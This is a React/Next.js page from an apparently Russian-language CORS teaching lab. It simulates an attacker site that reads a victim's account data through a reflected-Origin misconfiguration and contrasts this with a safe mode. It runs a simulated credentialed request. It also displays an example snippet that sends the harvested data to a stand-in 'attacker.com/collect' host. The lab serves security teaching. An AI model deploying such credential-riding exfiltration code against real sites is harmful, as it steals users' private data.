'use client'

import { useState } from "react";
import { useTheme } from "next-themes";
import {
  Bug,
  Skull,
  RefreshCw,
  ArrowLeft,
  AlertTriangle,
  Eye,
  ShieldAlert,
  Terminal,
  Moon,
  Sun,
  ChevronDown,
  KeyRound,
  Code2,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Separator } from "@/components/ui/separator";
import Link from "next/link";

interface AccountData {
  username: string;
  email: string;
  accessLevel: string;
  balance: string;
  accountNumber: string;
  lastLogin: string;
}

interface CorsInfo {
  mode: "vulnerable" | "safe";
  origin: string | null;
  accessControlAllowOrigin: string | null;
  accessControlAllowCredentials: string | null;
  allowed: boolean;
  reason: string;
}

interface AccountResponse {
  data: AccountData | null;
  cors: CorsInfo;
}

/* ------------------------------------------------------------------ */
/*  Scroll-to-bottom button                                            */
/* ------------------------------------------------------------------ */

function ScrollDownButton() {
  const [visible, setVisible] = useState(true);

  useState(() => {
    const onScroll = () => {
      const atBottom =
        window.innerHeight + window.scrollY >= document.body.scrollHeight - 100;
      setVisible(!atBottom);
    };
    window.addEventListener("scroll", onScroll, { passive: true });
    return () => window.removeEventListener("scroll", onScroll);
  });

  if (!visible) return null;

  return (
    <button
      onClick={() =>
        window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" })
      }
      className="fixed bottom-6 right-6 z-50 flex items-center gap-2 px-4 py-3 rounded-full bg-red-700 text-white shadow-lg hover:shadow-xl transition-all hover:scale-105"
      aria-label="Прокрутить вниз"
    >
      <ChevronDown className="h-5 w-5" />
      <span className="text-sm font-medium hidden sm:inline">Вниз</span>
    </button>
  );
}

/* ------------------------------------------------------------------ */
/*  Page                                                               */
/* ------------------------------------------------------------------ */

export default function AttackerPage() {
  const [stolenData, setStolenData] = useState<AccountData | null>(null);
  const [corsInfo, setCorsInfo] = useState<CorsInfo | null>(null);
  const [loading, setLoading] = useState(false);
  const [attackLog, setAttackLog] = useState<string[]>([]);
  const [mounted, setMounted] = useState(false);

  const { theme, setTheme } = useTheme();

  useState(() => {
    setMounted(true);
  });

  const addLog = (msg: string) => {
    setAttackLog((prev) => [
      ...prev,
      `[${new Date().toLocaleTimeString()}] ${msg}`,
    ]);
  };

  const launchAttack = async () => {
    setLoading(true);
    setStolenData(null);
    setCorsInfo(null);
    setAttackLog([]);

    addLog("Запуск атаки: отправка кросс-доменного запроса к /api/account...");
    addLog("fetch('/api/account', { credentials: 'include', headers: { 'X-Simulated-Origin': 'https://evil-phishing.com' } })");

    try {
      const res = await fetch("/api/account", {
        credentials: "include",
        headers: { "X-Simulated-Origin": "https://evil-phishing.com" },
      });
      const data: AccountResponse = await res.json();

      addLog(`Статус ответа: ${res.status}`);
      addLog(`Origin в запросе: ${data.cors.origin || "отсутствует"}`);
      addLog(
        `ACAO в ответе: ${data.cors.accessControlAllowOrigin || "не установлен"}`
      );
      addLog(
        `ACAC в ответе: ${data.cors.accessControlAllowCredentials || "не установлен"}`
      );

      if (data.cors.allowed) {
        addLog("⚠ CORS разрешил доступ! Браузер передал данные атакующему.");
      } else {
        addLog("✓ CORS заблокировал доступ. Атака не удалась.");
      }

      setCorsInfo(data.cors);
      setStolenData(data.data);
    } catch (err) {
      addLog(`Ошибка: ${err instanceof Error ? err.message : "Неизвестная ошибка"}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-background text-foreground">
      {/* ===== HEADER ===== */}
      <header className="border-b border-red-800/50 dark:border-red-900/50 bg-card sticky top-0 z-40">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="p-2 rounded-lg bg-red-100 text-red-600 dark:bg-red-950/50 dark:text-red-400">
                <Skull className="h-6 w-6" />
              </div>
              <div>
                <h1 className="text-xl font-bold tracking-tight text-red-600 dark:text-red-400">
                  Страница атаки (evil.com)
                </h1>
                <p className="text-sm text-muted-foreground">
                  Имитация вредоносного сайта
                </p>
              </div>
            </div>
            <div className="flex items-center gap-2">
              {mounted && (
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() => setTheme(theme === "dark" ? "light" : "dark")}
                  aria-label="Переключить тему"
                >
                  {theme === "dark" ? (
                    <Sun className="h-4 w-4" />
                  ) : (
                    <Moon className="h-4 w-4" />
                  )}
                </Button>
              )}
              <Link href="/">
                <Button variant="outline" size="sm">
                  <ArrowLeft className="mr-2 h-4 w-4" />
                  Вернуться на лабораторию
                </Button>
              </Link>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-6 space-y-6">
        {/* Warning */}
        <Alert variant="destructive">
          <AlertTriangle className="h-4 w-4" />
          <AlertTitle>Это учебная страница атаки</AlertTitle>
          <AlertDescription>
            Данная страница имитирует действия злоумышленника. Все данные фиктивные.
            В реальной атаке эта страница находилась бы на совершенно другом домене
            (например, <code className="px-1 py-0.5 bg-muted rounded text-xs">evil-phishing.com</code>),
            а не на том же сервере. Атакующий мог бы заманить жертву через фишинговое письмо,
            рекламу или ссылку в соцсетях.
          </AlertDescription>
        </Alert>

        {/* Attack explanation */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Bug className="h-5 w-5 text-red-500" />
              Как работает атака
            </CardTitle>
            <CardDescription>
              Пошаговое объяснение механизма эксплуатации уязвимости CORS
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid gap-3">
              {[
                {
                  step: "1",
                  title: "Жертва авторизуется на уязвимом сайте",
                  desc: "Браузер сохраняет сессионные cookie для домена уязвимого приложения. Cookie прикрепляются автоматически ко всем запросам к этому домену, включая кросс-доменные.",
                  icon: <KeyRound className="h-4 w-4" />,
                },
                {
                  step: "2",
                  title: "Жертва посещает вредоносный сайт (эта страница)",
                  desc: "Злоумышленник заманивает жертву через фишинговое письмо, рекламу или ссылку. Жертва не подозревает об опасности — страница выглядит безобидно.",
                  icon: <Skull className="h-4 w-4" />,
                },
                {
                  step: "3",
                  title: "JavaScript атакующего отправляет запрос к API",
                  desc: "fetch() с credentials: 'include' — браузер автоматически прикрепляет cookie жертвы. Запрос происходит в фоновом режиме — жертва ничего не замечает.",
                  icon: <Code2 className="h-4 w-4" />,
                },
                {
                  step: "4",
                  title: "Сервер отражает Origin без проверки",
                  desc: "ACAO: evil.com + ACAC: true — браузер видит, что сервер разрешил доступ для Origin атакующего, и разрешает JavaScript прочитать ответ.",
                  icon: <AlertTriangle className="h-4 w-4" />,
                },
                {
                  step: "5",
                  title: "Данные жертвы украдены",
                  desc: "Атакующий получает email, баланс, номер счёта и другие конфиденциальные данные. Данные можно автоматически отправить на сервер атакующего.",
                  icon: <Eye className="h-4 w-4" />,
                },
              ].map((item) => (
                <div
                  key={item.step}
                  className="flex gap-3 p-3 rounded-lg bg-muted/50 border"
                >
                  <div className="flex-shrink-0 w-8 h-8 rounded-full bg-red-100 text-red-600 dark:bg-red-950/50 dark:text-red-400 flex items-center justify-center text-sm font-bold">
                    {item.step}
                  </div>
                  <div>
                    <h4 className="text-sm font-medium flex items-center gap-2">
                      {item.icon}
                      {item.title}
                    </h4>
                    <p className="text-xs text-muted-foreground mt-0.5">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Attack button */}
        <Card className="border-red-200 dark:border-red-900/50">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-red-600 dark:text-red-400">
              <ShieldAlert className="h-5 w-5" />
              Эксплуатация уязвимости
            </CardTitle>
            <CardDescription>
              Нажмите кнопку, чтобы выполнить кросс-доменный запрос к уязвимому API
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <Button
              onClick={launchAttack}
              disabled={loading}
              variant="destructive"
              size="lg"
              className="w-full sm:w-auto"
            >
              {loading ? (
                <RefreshCw className="mr-2 h-5 w-5 animate-spin" />
              ) : (
                <Bug className="mr-2 h-5 w-5" />
              )}
              Получить данные жертвы
            </Button>

            {/* Attack log */}
            {attackLog.length > 0 && (
              <div className="bg-muted rounded-lg p-4 font-mono text-xs space-y-1 max-h-48 overflow-y-auto">
                <div className="text-emerald-600 dark:text-emerald-400 mb-2">
                  <Terminal className="inline h-3 w-3 mr-1" />
                  Лог атаки:
                </div>
                {attackLog.map((log, i) => (
                  <div
                    key={i}
                    className={
                      log.includes("⚠")
                        ? "text-red-600 dark:text-red-400"
                        : log.includes("✓")
                        ? "text-emerald-600 dark:text-emerald-400"
                        : "text-muted-foreground"
                    }
                  >
                    {log}
                  </div>
                ))}
              </div>
            )}

            {/* Stolen data display */}
            {stolenData && (
              <div className="space-y-3">
                <h3 className="text-sm font-semibold text-red-600 dark:text-red-400 flex items-center gap-2">
                  <Eye className="h-4 w-4" />
                  Украденные данные:
                </h3>
                <div className="bg-red-50 border border-red-200 dark:bg-red-950/30 dark:border-red-800 rounded-lg p-4 font-mono text-sm space-y-2">
                  <div className="text-red-700 dark:text-red-300">
                    <span className="text-muted-foreground">username:</span>{" "}
                    {stolenData.username}
                  </div>
                  <div className="text-red-700 dark:text-red-300">
                    <span className="text-muted-foreground">email:</span>{" "}
                    {stolenData.email}
                  </div>
                  <div className="text-red-700 dark:text-red-300">
                    <span className="text-muted-foreground">accessLevel:</span>{" "}
                    {stolenData.accessLevel}
                  </div>
                  <div className="text-red-700 dark:text-red-300 font-bold">
                    <span className="text-muted-foreground">balance:</span>{" "}
                    {stolenData.balance}
                  </div>
                  <div className="text-red-700 dark:text-red-300">
                    <span className="text-muted-foreground">accountNumber:</span>{" "}
                    {stolenData.accountNumber}
                  </div>
                  <div className="text-red-700 dark:text-red-300">
                    <span className="text-muted-foreground">lastLogin:</span>{" "}
                    {stolenData.lastLogin}
                  </div>
                </div>
                <p className="text-xs text-muted-foreground">
                  В реальной атаке эти данные были бы автоматически отправлены на сервер злоумышленника
                  через XMLHttpRequest или fetch. Жертва ничего бы не заметила — запрос происходит в фоновом режиме.
                </p>
              </div>
            )}

            {/* Blocked state */}
            {corsInfo && !corsInfo.allowed && (
              <div className="bg-emerald-50 border border-emerald-200 dark:bg-emerald-950/30 dark:border-emerald-800 rounded-lg p-4">
                <div className="flex items-center gap-2 text-emerald-600 dark:text-emerald-400 text-sm font-semibold mb-2">
                  <ShieldAlert className="h-4 w-4" />
                  Атака заблокирована!
                </div>
                <p className="text-sm text-emerald-700 dark:text-emerald-300">
                  Безопасный режим CORS отклонил запрос с неизвестного Origin.
                  Данные жертвы защищены. {corsInfo.reason}
                </p>
                <p className="text-xs text-muted-foreground mt-2">
                  Когда сервер проверяет Origin по белому списку и отклоняет неизвестные домены,
                  браузер блокирует чтение ответа JavaScript атакующего. Даже если cookie были прикреплены к запросу,
                  атакующий не может прочитать ответ — данные в безопасности.
                </p>
              </div>
            )}

            {/* CORS info */}
            {corsInfo && (
              <div className="bg-muted rounded-lg p-4 text-xs font-mono space-y-2">
                <h4 className="text-muted-foreground mb-1">CORS-заголовки:</h4>
                <div className="grid grid-cols-2 gap-2">
                  <div className="text-muted-foreground">Режим:</div>
                  <div className={corsInfo.mode === "vulnerable" ? "text-red-600 dark:text-red-400" : "text-emerald-600 dark:text-emerald-400"}>
                    {corsInfo.mode === "vulnerable" ? "Уязвимый" : "Безопасный"}
                  </div>
                  <div className="text-muted-foreground">Origin:</div>
                  <div className="text-foreground">{corsInfo.origin || "—"}</div>
                  <div className="text-muted-foreground">ACAO:</div>
                  <div className={corsInfo.accessControlAllowOrigin ? "text-red-600 dark:text-red-400" : "text-emerald-600 dark:text-emerald-400"}>
                    {corsInfo.accessControlAllowOrigin || "не установлен"}
                  </div>
                  <div className="text-muted-foreground">ACAC:</div>
                  <div className={corsInfo.accessControlAllowCredentials === "true" ? "text-red-600 dark:text-red-400" : "text-emerald-600 dark:text-emerald-400"}>
                    {corsInfo.accessControlAllowCredentials || "не установлен"}
                  </div>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Attacker's code */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Code2 className="h-5 w-5" />
              Код атакующего
            </CardTitle>
            <CardDescription>
              Пример JavaScript, который злоумышленник размещает на своём сайте
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="bg-muted rounded-lg p-4 font-mono text-xs overflow-x-auto space-y-1">
              <div className="text-red-600 dark:text-red-400">{'// Код на evil-phishing.com'}</div>
              <div className="mt-1">fetch(<span className="text-red-600 dark:text-red-400">"https://victim.com/api/account"</span>, {"{"}</div>
              <div className="ml-4">credentials: <span className="text-red-600 dark:text-red-400">"include"</span>, <span className="text-muted-foreground">{'// cookie жертвы прикрепляются автоматически'}</span></div>
              <div>{"}"}).then(res =&gt; res.json()).then(data =&gt; {"{"}</div>
              <div className="ml-4 text-red-600 dark:text-red-400">{'// Данные жертвы получены! Отправляем на сервер атакующего'}</div>
              <div className="ml-4">fetch(<span className="text-red-600 dark:text-red-400">"https://attacker.com/collect"</span>, {"{"}</div>
              <div className="ml-8">method: <span className="text-red-600 dark:text-red-400">"POST"</span>,</div>
              <div className="ml-8">body: JSON.stringify(data)</div>
              <div className="ml-4">{"}"});</div>
              <div>{"}"});</div>
            </div>
            <p className="text-xs text-muted-foreground mt-3">
              Этот код выполняется в браузере жертвы. Браузер сам прикрепляет cookie к запросу
              (благодаря <code className="px-1 py-0.5 bg-muted rounded">credentials: &quot;include&quot;</code>),
              а сервер, отражающий Origin без проверки, разрешает чтение ответа.
              Вся передача данных происходит скрытно — жертва не видит никаких признаков атаки.
            </p>
          </CardContent>
        </Card>

        {/* Hint */}
        <Card>
          <CardContent className="p-4">
            <div className="flex items-start gap-3">
              <AlertTriangle className="h-5 w-5 text-amber-500 mt-0.5 flex-shrink-0" />
              <div className="text-sm text-muted-foreground space-y-2">
                <p className="font-medium text-foreground">
                  Попробуйте переключить режим на главной странице
                </p>
                <p>
                  Переключитесь на <Badge variant="default" className="text-xs">Безопасный режим</Badge> на
                  главной странице лаборатории и повторите атаку. Вы увидите, что сервер отклонит
                  запрос от неизвестного Origin, и данные жертвы будут защищены.
                </p>
                <p>
                  Также попробуйте переключить тему оформления с помощью кнопки{" "}
                  <Moon className="inline h-3 w-3" />/<Sun className="inline h-3 w-3" /> в правом верхнем углу.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>
      </main>

      {/* ===== FOOTER ===== */}
      <footer className="border-t bg-card mt-auto">
        <div className="container mx-auto px-4 py-6">
          <div className="flex flex-col items-center gap-3">
            <p className="text-sm text-muted-foreground text-center">
              Учебный стенд · Имитация атаки · Все данные фиктивные
            </p>
            <Separator className="max-w-xs" />
            <p className="text-sm font-semibold tracking-widest text-foreground">
              создатель <span className="text-red-600 dark:text-red-400">AZAR</span>
            </p>
          </div>
        </div>
      </footer>

      {/* Scroll down button */}
      <ScrollDownButton />
    </div>
  );
}
